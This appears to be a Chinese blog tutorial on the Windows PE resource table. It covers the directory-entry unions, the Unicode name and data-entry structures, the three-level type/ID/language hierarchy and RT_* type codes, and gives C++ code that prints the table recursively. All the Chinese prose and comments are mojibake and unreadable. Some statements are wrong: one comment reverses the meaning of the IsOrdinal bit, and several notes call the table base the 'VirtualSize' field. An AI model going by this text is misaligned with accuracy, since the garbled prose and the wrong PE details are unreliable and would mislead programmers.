èµ„æºç›®å½•é¡¹è·Ÿåœ¨èµ„æºç›®å½•å¤´åé¢é¦–å…ˆæŒ‰ç…§å­—æ¯å‡åº(ä¸åˆ†å¤§å°å†™ï¼‰æ’åˆ—åç§°èµ„æºç›®å½•é¡¹ï¼Œç„¶åå†æŒ‰IDå‡åºæ’åˆ—IDèµ„æºç›®å½•é¡¹ã€‚ æ¯ä¸ªèµ„æºç›®å½•é¡¹æ˜¯ä¸€ä¸ªIMAGE_RESOURCE_DIRECTORY_ENTRYç»“æ„ã€‚ èµ„æºç›®å½•é¡¹1234567891011121314151617typedef struct _IMAGE_RESOURCE_DIRECTORY_ENTRY &#123; union &#123; struct &#123; DWORD NameOffset:31; DWORD NameIsString:1; &#125; DUMMYSTRUCTNAME; DWORD Name; WORD Id; &#125; DUMMYUNIONNAME; union &#123; DWORD OffsetToData; struct &#123; DWORD OffsetToDirectory:31; DWORD DataIsDirectory:1; &#125; DUMMYSTRUCTNAME2; &#125; DUMMYUNIONNAME2;&#125; IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY; union+ä½åŸŸä¹‹å‰åœ¨å­¦ä¹ å¯¼å…¥è¡¨æ—¶ï¼Œå¯¹äºINTè¡¨æˆ–IATè¡¨è¡¨é¡¹ï¼ˆè¿˜æ²¡æ›¿æ¢ä¸ºå‡½æ•°åœ°å€ï¼‰ï¼Œæ¯ä¸ªè¡¨é¡¹å¯ä»¥æ˜¯ä¸€ä¸ªåºå·æˆ–ä¸€ä¸ªæŒ‡å‘HintNameçš„RVAæŒ‡é’ˆï¼Œè¿™å–å†³äºè¡¨é¡¹çš„æœ€é«˜ä½æ˜¯1è¿˜æ˜¯0ã€‚å½“è¿™ä¸ªDWORDå€¼æœ€é«˜ä½ä¸º1ï¼Œè¡¨ç¤ºå‡½æ•°ä»¥åºå·æ–¹å¼å¯¼å…¥ã€‚æ­¤æ—¶ä½31ä½è¡¨ç¤ºä¸€ä¸ªå‡½æ•°åºå·ã€‚å½“è¿™ä¸ªDWORDå€¼æœ€é«˜ä½ä¸º0ï¼Œè¡¨ç¤ºå‡½æ•°ä»¥å‡½æ•°åæ–¹å¼å¯¼å…¥ã€‚æ­¤æ—¶è¿™ä¸ªDWORDå€¼æ˜¯ä¸€ä¸ªæŒ‡å‘IMAGE_IMPORT_BY_NAMEç»“æ„çš„RVAåœ°å€ã€‚ç¼–ç¨‹æ—¶ç”¨ä½è¿ç®—å–æœ€é«˜ä½è¿›è¡ŒåŒºåˆ†çš„ä»£ç é€»è¾‘å¤§è‡´å¦‚ä¸‹ï¼š123456789//å‡è®¾è¿™ä¸ªæ˜¯INTè¡¨è¡¨é¡¹çš„ç»“æ„typedef struct _IMAGE_THUNK_DATA32 &#123;\tDWORD Item;&#125; IMAGE_THUNK_DATA32;if (*pINTTable &amp; 0x80000000) //æœ€é«˜ä½ä¸º1&#123;\t//...&#125;ä¸ºäº†æ–¹ä¾¿è¿™ç§åŒºåˆ†ï¼Œå¯ä»¥ç”¨ä½åŸŸï¼ˆbit-fieldsï¼‰+unionç»“æ„ã€‚å…·ä½“åšæ³•æ˜¯ï¼ŒåŠ ä¸€ä¸ªä½åŸŸï¼ˆbit-fieldsï¼‰ç»“æ„ä½“ï¼Œé‡Œé¢åˆ†åˆ«ç”¨ä¸¤ä¸ªå­—æ®µè¡¨ç¤ºè¿™ä¸ªDWORDçš„æœ€é«˜ä½å’Œä½31ä½ï¼Œå¤–é¢å†ç”¨unionåŒ…èµ·æ¥ï¼ˆè¿™æ ·æ²¡æœ‰æ”¹å˜åŸç»“æ„ä½“çš„å¤§å°ï¼‰ï¼Œé‚£ä¹ˆåœ¨ä»£ç ä¸­å°±ä¸éœ€è¦è‡ªå·±ç”¨ä½è¿ç®—ï¼Œç›´æ¥åˆ¤æ–­IsOrdinalçš„å€¼å³å¯ï¼Œä»£ç ç¤ºæ„å¦‚ä¸‹ï¼š1234567891011121314151617typedef struct _IMAGE_THUNK_DATA32 &#123;\tunion &#123; struct &#123; DWORD pHintNameItem : 31; // IsOrdinalä¸º1æ—¶ï¼ŒpHintNameItemæŒ‡å‘æç¤ºåè¡¨ï¼›IsOrdinalä¸º0æ—¶ï¼ŒpHintNameItemæ˜¯ä¸ªåºå· DWORD IsOrdinal : 1; // æœ€é«˜ä½ï¼Œæ ‡è¯†æ˜¯å¦ä¸ºåºå·å¯¼å…¥ &#125; u1; DWORD Item; // å®Œæ•´çš„DWORDè¡¨é¡¹\t&#125; u0;&#125; IMAGE_THUNK_DATA32;IMAGE_THUNK_DATA32* pINTTable;if (pINTTable-&gt;u0.u1.IsOrdinal) // æœ€é«˜ä½ä¸º1ï¼Œè¡¨ç¤ºåºå·å¯¼å…¥&#123;\t// ...&#125;ç”¨ä¸Šäº†ä½åŸŸï¼Œçœ‹åæ±‡ç¼–ä»£ç çš„è¯å…¶å®å°±æ˜¯ä½è¿ç®—ï¼Œç¼–è¯‘å™¨å¸®æˆ‘ä»¬å†™çš„ï¼Œå°±ä¸ç”¨æˆ‘ä»¬è‡ªå·±å†™äº† IMAGE_RESOURCE_DIRECTORY_ENTRYç»“æ„ä½“ç”±ä¸¤ä¸ªUnionç»“æ„ç»„æˆï¼Œå…±8å­—èŠ‚å¤§å°ã€‚ ç¬¬ä¸€ä¸ªunionç»“æ„ å½“NameIsStringï¼ˆæœ€é«˜ä½ï¼‰ä¸º0ï¼Œä½¿ç”¨Idå­—æ®µï¼Œè¡¨ç¤ºæ˜¯ä¸€ä¸ªç¼–å· å½“NameIsStringï¼ˆæœ€é«˜ä½ï¼‰ä¸º1ï¼Œä½¿ç”¨NameOffsetå­—æ®µï¼ŒNameOffsetï¼ˆå³ä½31ä½ï¼‰æ˜¯ä¸€ä¸ªæŒ‡å‘IMAGE_RESOURCE_DIR_STRING_Uç»“æ„ä½“çš„æŒ‡é’ˆï¼Œè¿™ä¸ªåç§»å€¼æ˜¯ç›¸å¯¹äºèµ„æºè¡¨çš„èµ·å§‹ä½ç½®ï¼ˆå³æ•°æ®ç›®å½•è¡¨ä¸­æè¿°èµ„æºè¡¨.VirtualSizeå­—æ®µï¼‰ åœ¨èµ„æºä¸­ï¼Œå¯¹å­—ç¬¦ä¸²çš„å®šä¹‰ä½¿ç”¨çš„æ˜¯Unicodeç¼–ç ï¼ŒIMAGE_RESOURCE_DIR_STRING_Uç»“æ„æè¿°è¿™ä¸ªUnicodeå­—ç¬¦ä¸²ã€‚ 1234typedef struct _IMAGE_RESOURCE_DIR_STRING_U &#123; WORD Length; // æè¿°å­—ç¬¦ä¸²é•¿åº¦ WCHAR NameString[ 1 ];&#125; IMAGE_RESOURCE_DIR_STRING_U, *PIMAGE_RESOURCE_DIR_STRING_U; å¯¹äºUnicodeå­—ç¬¦ä¸²ï¼Œä»¥0ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ç»“å°¾çš„æ–¹å¼ä¸ç§‘å­¦ã€‚æ‰€ä»¥è¿™é‡Œç”¨Lengthè®°å½•è¿™ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ ç¬¬äºŒä¸ªunionç»“æ„ å½“DataIsDirectoryï¼ˆæœ€é«˜ä½ï¼‰ä¸º0ï¼Œä½¿ç”¨OffsetToDataå­—æ®µï¼ŒOffsetToDataæŒ‡å‘èµ„æºæ•°æ®é¡¹IMAGE_RESOURCE_DATA_ENTRYï¼Œèµ„æºæ•°æ®é¡¹ç”¨äºæè¿°èµ„æºæ•°æ®çš„ä½ç½®å’Œå¤§å°ã€‚OffsetToDataå­—æ®µçš„åç§»æ˜¯ç›¸å¯¹äºèµ„æºè¡¨çš„èµ·å§‹ä½ç½®ï¼ˆå³æ•°æ®ç›®å½•è¡¨ä¸­æè¿°èµ„æºè¡¨.VirtualSizeå­—æ®µï¼‰ DataIsDirector=0ï¼Œé€šå¸¸å‡ºç°åœ¨ç¬¬ä¸‰çº§ç›®å½• å½“DataIsDirectoryï¼ˆæœ€é«˜ä½ï¼‰ä¸º1ï¼Œä½¿ç”¨OffsetToDirectoryå­—æ®µï¼ŒOffsetToDirectoryï¼ˆå³ä½31ä½ï¼‰æŒ‡å‘ä¸‹ä¸€ä¸ªèµ„æºç›®å½•çš„èµ·å§‹åœ°å€ æ³¨ï¼šNameOffsetå’ŒOffsetToDataå­—æ®µçš„åç§»éƒ½æ˜¯ç›¸å¯¹äºèµ„æºè¡¨çš„èµ·å§‹ä½ç½®ï¼ˆå³æ•°æ®ç›®å½•è¡¨ä¸­æè¿°èµ„æºè¡¨.VirtualSizeå­—æ®µï¼‰ èµ„æºæ•°æ®é¡¹123456typedef struct _IMAGE_RESOURCE_DATA_ENTRY &#123; DWORD OffsetToData; // èµ„æºæ•°æ®çš„RVAåœ°å€ DWORD Size; // èµ„æºæ•°æ®çš„é•¿åº¦ DWORD CodePage; // ä»£ç é¡µï¼Œä¸€èˆ¬ä¸º0 DWORD Reserved; // ä¿ç•™å­—æ®µ&#125; IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY; OffsetToDataï¼šæŒ‡å‘çš„è¿˜ä¸æ˜¯èµ¤è£¸è£¸èµ„æºä¿¡æ¯çš„äºŒè¿›åˆ¶æ•°æ®ï¼Œè€Œæ˜¯é™„åŠ äº†ä¸€äº›æ•°æ®ç»“æ„çš„èµ„æºå¿«ã€‚å¦‚æœæƒ³å°†èµ„æºä¸­çš„icoå›¾æ‰£å‡ºæ¥ï¼Œé€šè¿‡OffsetToDataæŒ‡è¿‡å»åï¼Œç»§ç»­æŸ¥å›¾æ ‡ç»„èµ„æºè§£æçš„èµ„æ–™å¾—çŸ¥æ€ä¹ˆç»§ç»­è§£æï¼›å¦‚æœæƒ³å°†å¯¹è¯æ¡†æ‰£å‡ºæ¥ï¼Œç»§ç»­æŸ¥å¯¹è¯æ¡†èµ„æºè§£æçš„èµ„æ–™å¾—çŸ¥æ€ä¹ˆç»§ç»­è§£æã€‚è¿™é‡Œä¸åšä»‹ç» ä¸åŒå±‚çº§ä¸‹èµ„æºç›®å½•é¡¹å­—æ®µçš„ä¸åŒå«ä¹‰ ä¸‰å±‚å±‚çº§ä¸­æ¯ä¸ªèŠ‚ç‚¹çš„èµ„æºç›®å½•é¡¹éƒ½æ˜¯ç”¨IMAGE_RESOURCE_DIRECTORY_ENTRYç»“æ„ä½“è¡¨ç¤ºï¼Œä½†å®ƒä»¬åœ¨ä¸åŒå±‚çº§æ—¶ï¼Œèµ„æºç›®å½•é¡¹ä¸­å­—æ®µçš„å«ä¹‰æ˜¯ä¸ä¸€æ ·çš„ã€‚ IMAGE_RESOURCE_DATA_ENTRYä¸­ç¬¬ä¸€ä¸ªUnionå­—æ®µ åœ¨ç¬¬ä¸€å±‚ä¸­ï¼Œèµ„æºç›®å½•å—è¡¨ç¤ºèµ„æºç±»å‹ã€‚èµ„æºç›®å½•é¡¹ä¸­çš„Nameå­—æ®µè¡¨ç¤ºè¿™æ˜¯æ ‡å‡†çš„èµ„æºç±»å‹è¿˜æ˜¯éæ ‡å‡†çš„ã€‚idæ•°å€¼åœ¨1-16ä¹‹é—´å°±æ˜¯ç³»ç»Ÿé¢„å®šä¹‰çš„æ ‡å‡†èµ„æºç±»å‹ã€‚ æœ€é«˜ä½ä¸º1ï¼Œä½¿ç”¨NameOffsetå­—æ®µï¼ŒNameOffsetæŒ‡å‘IMAGE_RESOURCE_DIR_STRING_Uç»“æ„ã€‚å­—ç¬¦ä¸²ä¸ºéæ ‡å‡†çš„ç±»å‹çš„åå­—ã€‚ æœ€é«˜ä½ä¸º0ï¼Œä½¿ç”¨Idå­—æ®µã€‚ å¸¸é‡ç¬¦å· æ•°å€¼ å«ä¹‰ RT_CURSOR 1 å…‰æ ‡ï¼ˆCusorï¼‰ RT_BITMAP 2 ä½å›¾ï¼ˆBitmapï¼‰ RT_ICON 3 å›¾æ ‡ï¼ˆIconï¼‰ RT_MENU 4 èœå•ï¼ˆMenuï¼‰ RT_DIALOG 5 å¯¹è¯æ¡†ï¼ˆDialogï¼‰ RT_STRING 6 å­—ç¬¦ä¸²ï¼ˆStringï¼‰ RT_FONTDIR 7 å­—ä½“ç›®å½•ï¼ˆFont Directoryï¼‰ RT_FONT 8 å­—ä½“ï¼ˆFontï¼‰ RT_ACCELERATOR 9 åŠ é€Ÿé”®ï¼ˆAcceleratorsï¼‰ RT_RCDATA 10 æœªæ ¼å¼åŒ–èµ„æºï¼ˆUnformattedï¼‰ RT_MESSAGETABLE 11 æ¶ˆæ¯è¡¨ï¼ˆMessageTableï¼‰ RT_GROUP_CURSOR 12 å…‰æ ‡ç»„ï¼ˆGroup Cursorï¼‰ RT_GROUP_ICON 14 å›¾æ ‡ç»„ï¼ˆGroup Iconï¼‰ RT_VERSION 16 ç‰ˆæœ¬ä¿¡æ¯ï¼ˆVersion Informationï¼‰ åŠ é€Ÿé”®ï¼ˆAcceleratorsï¼‰æŒ‡çš„æ˜¯å¿«æ·é”® å›¾æ ‡ç»„æ˜¯å¯¹å›¾æ ‡ä¿¡æ¯çš„æè¿° åªåœ¨ç¨‹åºä¸­åŠ äº†ä¸€ä¸ªå›¾æ ‡ï¼Œä½†ç”¨ResHackerçœ‹ä¼šæœ‰å¥½å‡ ä¸ªå›¾æ ‡ã€‚è¿™æ˜¯ç¼–è¯‘å™¨ä¸ºäº†é€‚åº”ä¸åŒåˆ†è¾¨ç‡æƒ…å†µï¼ŒåŠ çš„å›¾æ ‡ åœ¨ç¬¬äºŒå±‚ä¸­ï¼Œèµ„æºç›®å½•å—è¡¨ç¤ºèµ„æºçš„IDã€‚åœ¨ç¬¬äºŒå±‚æ—¶ï¼Œèµ„æºç›®å½•é¡¹ä¸­çš„Nameå­—æ®µè¡¨ç¤ºè¿™æ˜¯æ ‡å‡†å‘½åè¿˜æ˜¯éæ ‡å‡†å‘½åã€‚ åœ¨ç¬¬ä¸‰å±‚ä¸­ï¼Œèµ„æºç›®å½•å—è¡¨ç¤ºèµ„æºçš„ä»£ç é¡µã€‚åœ¨ç¬¬ä¸‰å±‚æ—¶ï¼Œèµ„æºç›®å½•é¡¹ä¸­çš„Nameå­—æ®µè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªæ ‡å‡†è¿˜æ˜¯éæ ‡å‡†çš„è¯­è¨€ã€‚ è¯¦ç»†ç»†èŠ‚å…·ä½“çœ‹ã€ŠWindowsPEæƒå¨æŒ‡å—ã€‹P207-208 IMAGE_RESOURCE_DATA_ENTRYä¸­ç¬¬äºŒä¸ªUnionå­—æ®µ ç†è®ºä¸Šæ¥è¯´èµ„æºç»“æ„å¯ä»¥æ˜¯nå±‚ï¼Œä½†ä¸€èˆ¬æ˜¯ä¸‰å±‚ç»“æ„ã€‚ç¬¬ä¸€ç¬¬äºŒå±‚è¿™ä¸ªå€¼æœ€é«˜ä½ä¸º1ï¼Œç”¨OffsetToDirectoryå­—æ®µï¼ŒæŒ‡å‘ä¸‹ä¸€å±‚èµ„æºç›®å½•å—ã€‚åœ¨ç¬¬ä¸‰å±‚æ—¶ï¼Œç”¨OffsetToDataå­—æ®µï¼ŒæŒ‡å‘çœŸå®çš„èµ„æºæ•°æ®å—ã€‚ æ‰“å°èµ„æºè¡¨ èµ„æºè¿™ç§ç»“æ„è®¾è®¡ï¼Œç†è®ºä¸Šæ”¯æŒnçº§ã€‚ä½†ä¸€èˆ¬æ˜¯ä¸‰å±‚ï¼Œä¹Ÿå°±æ˜¯è¯´å±‚æ•°æ˜¯çŸ¥é“çš„ï¼Œæ‰€ä»¥å¯ä»¥å†™ä¸ªå¾ªç¯æ¥æ‰“å°ã€‚ä½†ä¸ºäº†ä»¥åä»£ç çš„æ›´æ–°ç»´æŠ¤ï¼Œè¿™é‡Œç”¨é€’å½’çš„æ–¹å¼å®ç°èµ„æºè¡¨æ‰“å°ã€‚ å¯¹äºæ¯ä¸€ä¸ªèŠ‚ç‚¹ï¼š æ‰“å°å®ƒçš„èµ„æºç›®å½•å¤´éƒ¨åˆ† æ‰“å°å®ƒçš„èµ„æºç›®å½•é¡¹éƒ¨åˆ† åœ¨ä¸åŒå±‚çº§ï¼Œç›®å½•é¡¹é‡Œå­—æ®µä»£è¡¨çš„å«ä¹‰ä¸åŒã€‚åœ¨é€’å½’å‡½æ•°ç”¨ä¸€ä¸ªå‚æ•°è¡¨ç¤ºå±‚çº§ å¯¹äºç¬¬ä¸€ä¸ªUnionè”åˆç»“æ„ åœ¨ç¬¬ä¸€å±‚ï¼Œè¡¨ç¤ºè¿™ä¸ªèµ„æºæ˜¯æ ‡å‡†è¿˜æ˜¯éæ ‡å‡†ç±»å‹ åœ¨ç¬¬äºŒå±‚ï¼Œè¡¨ç¤ºè¿™ä¸ªèµ„æºæ˜¯æ ‡å‡†å‘½åè¿˜æ˜¯éæ ‡å‡†å‘½å åœ¨ç¬¬ä¸‰å±‚ï¼Œè¡¨ç¤ºè¿™ä¸ªèµ„æºæ˜¯æ ‡å‡†è¯­è¨€ä»£ç è¿˜æ˜¯éæ ‡å‡†è¯­è¨€ä»£ç  å¯¹äºç¬¬äºŒä¸ªUnionè”åˆç»“æ„ åœ¨ç¬¬ä¸€å±‚ï¼ŒæŒ‡å‘ä¸‹ä¸€çº§èµ„æºç›®å½•å— åœ¨ç¬¬äºŒå±‚ï¼ŒæŒ‡å‘ä¸‹ä¸€çº§èµ„æºç›®å½•å— åœ¨ç¬¬ä¸‰å±‚ï¼ŒæŒ‡å‘ä¸‹ä¸€çº§èµ„æºæ•°æ®é¡¹ å‡½æ•°å¤§è‡´æ¡†æ¶123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960//pResourceDirectoryï¼šæŒ‡å‘èµ„æºç›®å½•å—/èŠ‚ç‚¹//levelï¼šå±‚çº§VOID PrintResourceDirectory(PIMAGE_RESOURCE_DIRECTORY pResourceDirectory, int level)&#123; //1ã€æ‰“å°èµ„æºç›®å½•å¤´ //...... //2ã€æ‰“å°èµ„æºç›®å½•é¡¹ auto pResourceDirectoryEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)((DWORD)pResourceDirectory + sizeof(IMAGE_RESOURCE_DIRECTORY)); for (int i = 0; i &lt; pResourceDirectory-&gt;NumberOfNamedEntries + pResourceDirectory-&gt;NumberOfIdEntries; ++i) &#123; // å¤„ç†ç¬¬ä¸€ä¸ªUnionç»“æ„ if (level == 1) // ç¬¬ä¸€å±‚ï¼Œè¡¨ç¤ºèµ„æºçš„ç±»å‹ &#123; if (pResourceDirectoryEntry-&gt;NameIsString) // æœ€é«˜ä½ä¸º1ï¼ŒæŒ‡å‘Unicodeå­—ç¬¦ä¸²ç»“æ„ã€‚éæ ‡å‡†ç±»å‹èµ„æº &#123; //... &#125; else // æœ€é«˜ä½ä¸º0ï¼ŒIdå­—æ®µã€‚æ ‡å‡†èµ„æºç±»å‹ &#123; //... &#125; &#125; else if (level == 2) // ç¬¬äºŒå±‚ï¼Œè¡¨ç¤ºèµ„æºçš„ID &#123; if (pResourceDirectoryEntry-&gt;NameIsString) // æœ€é«˜ä½ä¸º1ï¼ŒæŒ‡å‘Unicodeå­—ç¬¦ä¸²ç»“æ„ã€‚éæ ‡å‡†ID &#123; //... &#125; else // æœ€é«˜ä½ä¸º0ï¼ŒIdå­—æ®µã€‚æ ‡å‡†èµ„æºID &#123; //... &#125; &#125; else if (level == 3) // ç¬¬ä¸‰å±‚ï¼Œè¡¨ç¤ºèµ„æºçš„ä»£ç é¡µ &#123; if (pResourceDirectoryEntry-&gt;NameIsString) // æœ€é«˜ä½ä¸º1ï¼ŒæŒ‡å‘Unicodeå­—ç¬¦ä¸²ç»“æ„ã€‚éæ ‡å‡†è¯­è¨€ &#123; //... &#125; else // æœ€é«˜ä½ä¸º0ï¼ŒIdå­—æ®µã€‚æ ‡å‡†è¯­è¨€ &#123; //... &#125; &#125; // å¤„ç†ç¬¬äºŒä¸ªUnionç»“æ„ if (pResourceDirectoryEntry-&gt;DataIsDirectory) // æœ€é«˜ä½ä¸º1ï¼ŒæŒ‡å‘ä¸‹ä¸€çº§ç›®å½• &#123; //... //é€’å½’è°ƒç”¨ &#125; else // æœ€é«˜ä½ä¸º0ï¼ŒæŒ‡å‘æ•°æ® &#123; //... &#125; pResourceDirectoryEntry++; &#125;&#125; æ‰“å°èµ„æºè¡¨é€’å½’å‡½æ•°è®°å½•æ ‡å‡†èµ„æºç±»å‹æ•°å€¼å’Œæ–‡å­—çš„æ˜ å°„123456789VOID PEManipulator::PrintResourceTable()&#123; auto pResourceDirectory = (PIMAGE_RESOURCE_DIRECTORY)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_RESOURCE); if (!pResourceDirectory) &#123; return; &#125; PrintResourceDirectory(pResourceDirectory, 1); // å¼€å§‹æ‰“å°ä¸€çº§èµ„æºç›®å½•&#125;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111VOID PEManipulator::PrintResourceDirectory(PIMAGE_RESOURCE_DIRECTORY pResourceDirectory, int level)&#123; if (!pResourceDirectory) //å‚æ•°æ£€æŸ¥ &#123; return; &#125; // èµ„æºè¡¨èµ·å§‹ä½ç½®ï¼Œå·²è½¬ä¸ºFOA auto pBaseResourceDirectory = (PIMAGE_RESOURCE_DIRECTORY)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_RESOURCE); if (!pBaseResourceDirectory) &#123; return; &#125; // æ ¹æ®å±‚çº§ç”Ÿæˆç¼©è¿›å­—ç¬¦ä¸²ï¼Œæ¯å±‚ç¼©è¿›25ä¸ªç©ºæ ¼ char Indent[70] = &#123; 0 &#125;; for (int i = 0; i &lt; (level - 1) * 25 &amp;&amp; i &lt; sizeof(Indent) - 1; ++i) &#123; Indent[i] = &#x27; &#x27;; &#125; //1ã€æ‰“å°èµ„æºç›®å½•å¤´ printf(&quot;%s[%dçº§èµ„æºç›®å½•å¤´] &quot;, Indent, level); printf(&quot;%sCharacteristics: 0x%08X &quot;, Indent, pResourceDirectory-&gt;Characteristics); printf(&quot;%sTimeDateStamp: 0x%08X &quot;, Indent, pResourceDirectory-&gt;TimeDateStamp); printf(&quot;%sMajorVersion: 0x%04X &quot;, Indent, pResourceDirectory-&gt;MajorVersion); printf(&quot;%sMinorVersion: 0x%04X &quot;, Indent, pResourceDirectory-&gt;MinorVersion); printf(&quot;%sNumberOfNamedEntries: 0x%04X &quot;, Indent, pResourceDirectory-&gt;NumberOfNamedEntries); printf(&quot;%sNumberOfIdEntries: 0x%04X &quot;, Indent, pResourceDirectory-&gt;NumberOfIdEntries); //2ã€æ‰“å°èµ„æºç›®å½•é¡¹ auto pResourceDirectoryEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)((DWORD)pResourceDirectory + sizeof(IMAGE_RESOURCE_DIRECTORY)); for (int i = 0; i &lt; pResourceDirectory-&gt;NumberOfNamedEntries + pResourceDirectory-&gt;NumberOfIdEntries; ++i) &#123; printf(&quot;%s[%dçº§èµ„æºç›®å½•é¡¹] &quot;, Indent, level); // å¤„ç†ç¬¬ä¸€ä¸ªUnionç»“æ„ if (level == 1) // ç¬¬ä¸€å±‚ï¼Œè¡¨ç¤ºèµ„æºçš„ç±»å‹ &#123; if (pResourceDirectoryEntry-&gt;NameIsString) // æœ€é«˜ä½ä¸º1ï¼ŒæŒ‡å‘Unicodeå­—ç¬¦ä¸²ç»“æ„ã€‚éæ ‡å‡†ç±»å‹èµ„æº &#123; auto pResourceString = (PIMAGE_RESOURCE_DIR_STRING_U)((DWORD)pBaseResourceDirectory + pResourceDirectoryEntry-&gt;NameOffset); printf(&quot;%sName: &quot;, Indent); for (int j = 0; j &lt; pResourceString-&gt;Length; ++j) &#123; printf(&quot;%c&quot;, pResourceString-&gt;NameString[j]); &#125; printf(&quot; &quot;); &#125; else // æœ€é«˜ä½ä¸º0ï¼ŒIdå­—æ®µã€‚æ ‡å‡†èµ„æºç±»å‹ &#123; WORD ResourceId = pResourceDirectoryEntry-&gt;Id; const char* ResourceType = GetResourceTypeString(ResourceId); printf(&quot;%sId: 0x%04X (%s) &quot;, Indent, ResourceId, ResourceType); &#125; &#125; else if (level == 2) // ç¬¬äºŒå±‚ï¼Œè¡¨ç¤ºèµ„æºçš„ID &#123; if (pResourceDirectoryEntry-&gt;NameIsString) // æœ€é«˜ä½ä¸º1ï¼ŒæŒ‡å‘Unicodeå­—ç¬¦ä¸²ç»“æ„ã€‚éæ ‡å‡†ID &#123; auto pResourceString = (PIMAGE_RESOURCE_DIR_STRING_U)((DWORD)pBaseResourceDirectory + pResourceDirectoryEntry-&gt;NameOffset); printf(&quot;%sName: &quot;, Indent); for (int j = 0; j &lt; pResourceString-&gt;Length; ++j) &#123; printf(&quot;%c&quot;, pResourceString-&gt;NameString[j]); &#125; printf(&quot; &quot;); &#125; else // æœ€é«˜ä½ä¸º0ï¼ŒIdå­—æ®µã€‚æ ‡å‡†èµ„æºID &#123; WORD ResourceId = pResourceDirectoryEntry-&gt;Id; printf(&quot;%sId: 0x%04X &quot;, Indent, ResourceId); &#125; &#125; else if (level == 3) // ç¬¬ä¸‰å±‚ï¼Œè¡¨ç¤ºèµ„æºçš„ä»£ç é¡µ &#123; if (pResourceDirectoryEntry-&gt;NameIsString) // æœ€é«˜ä½ä¸º1ï¼ŒæŒ‡å‘Unicodeå­—ç¬¦ä¸²ç»“æ„ã€‚éæ ‡å‡†è¯­è¨€ &#123; auto pResourceString = (PIMAGE_RESOURCE_DIR_STRING_U)((DWORD)pBaseResourceDirectory + pResourceDirectoryEntry-&gt;NameOffset); printf(&quot;%sLanguage: &quot;, Indent); for (int j = 0; j &lt; pResourceString-&gt;Length; ++j) &#123; printf(&quot;%c&quot;, pResourceString-&gt;NameString[j]); &#125; printf(&quot; &quot;); &#125; else // æœ€é«˜ä½ä¸º0ï¼ŒIdå­—æ®µã€‚æ ‡å‡†è¯­è¨€ &#123; WORD ResourceId = pResourceDirectoryEntry-&gt;Id; printf(&quot;%sLanguageId: 0x%04X &quot;, Indent, ResourceId); &#125; &#125; // å¤„ç†ç¬¬äºŒä¸ªUnionç»“æ„ if (pResourceDirectoryEntry-&gt;DataIsDirectory) // æœ€é«˜ä½ä¸º1ï¼ŒæŒ‡å‘ä¸‹ä¸€çº§ç›®å½• &#123; printf(&quot;%sOffsetToDirectory: 0x%08X ï¼ˆæŒ‡å‘ä¸‹ä¸€çº§ç›®å½•ï¼‰ &quot;, Indent, pResourceDirectoryEntry-&gt;OffsetToData); //æŒ‰OffsetToDataæ‰“ï¼ŒæŠŠæœ€é«˜ä½ä¹Ÿæ‰“å°äº† auto pSubResourceDirectory = (PIMAGE_RESOURCE_DIRECTORY)((DWORD)pBaseResourceDirectory + pResourceDirectoryEntry-&gt;OffsetToDirectory); PrintResourceDirectory(pSubResourceDirectory, level + 1); // é€’å½’è°ƒç”¨ &#125; else // æœ€é«˜ä½ä¸º0ï¼ŒæŒ‡å‘æ•°æ® &#123; printf(&quot;%sOffsetToData: 0x%08X ï¼ˆæŒ‡å‘æ•°æ®ï¼‰ &quot;, Indent, pResourceDirectoryEntry-&gt;OffsetToData); auto pResourceDataEntry = (PIMAGE_RESOURCE_DATA_ENTRY)((DWORD)pBaseResourceDirectory + pResourceDirectoryEntry-&gt;OffsetToData); printf(&quot; %s[èµ„æºè¡¨çš„æ•°æ®ä¿¡æ¯] &quot;, Indent); printf(&quot; %sOffsetToData: 0x%08X &quot;, Indent, pResourceDataEntry-&gt;OffsetToData); printf(&quot; %sSize: 0x%08X &quot;, Indent, pResourceDataEntry-&gt;Size); printf(&quot; %sCodePage: 0x%08X &quot;, Indent, pResourceDataEntry-&gt;CodePage); printf(&quot; %sReserved: 0x%08X &quot;, Indent, pResourceDataEntry-&gt;Reserved); &#125; pResourceDirectoryEntry++; &#125;&#125;123456789101112131415161718192021222324252627const char* PEManipulator::GetResourceTypeString(WORD resourceId)&#123; static const std::unordered_map&lt;WORD, std::string&gt; resourceTypeMap = &#123; &#123;1, &quot;Cursor å…‰æ ‡&quot;&#125;, &#123;2, &quot;Bitmap ä½å›¾&quot;&#125;, &#123;3, &quot;Icon å›¾æ ‡&quot;&#125;, &#123;4, &quot;Menu èœå•&quot;&#125;, &#123;5, &quot;Dialog å¯¹è¯æ¡†&quot;&#125;, &#123;6, &quot;String å­—ç¬¦ä¸²&quot;&#125;, &#123;7, &quot;Font Directory å­—ä½“ç›®å½•&quot;&#125;, &#123;8, &quot;Font å­—ä½“ &quot;&#125;, &#123;9, &quot;Accelerators åŠ é€Ÿé”®&quot;&#125;, &#123;10, &quot;Unformatted æœªæ ¼å¼åŒ–èµ„æº &quot;&#125;, &#123;11, &quot;MessageTable æ¶ˆæ¯è¡¨&quot;&#125;, &#123;12, &quot;Group Cursor å…‰æ ‡ç»„&quot;&#125;, &#123;14, &quot;Group Icon å›¾æ ‡ç»„&quot;&#125;, &#123;16, &quot;Version Information ç‰ˆæœ¬ä¿¡æ¯&quot;&#125; &#125;; auto it = resourceTypeMap.find(resourceId); // åœ¨mapä¸­æŸ¥æ‰¾æŒ‡å®šçš„é”® if (it != resourceTypeMap.end()) // å¦‚æœæ‰¾åˆ° &#123; return it-&gt;second.c_str(); // è¿”å›å¯¹åº”çš„å­—ç¬¦ä¸² &#125; return &quot;Unknownï¼ˆæœªçŸ¥ï¼‰&quot;; // å¦‚æœæ²¡æ‰¾åˆ°ï¼Œè¿”å›&quot;Unknownï¼ˆæœªçŸ¥ï¼‰&quot;&#125; ä¸Šé¢çš„ä»£ç æœ‰å‡ å¤„ç»†èŠ‚æä¸€ä¸‹ï¼š 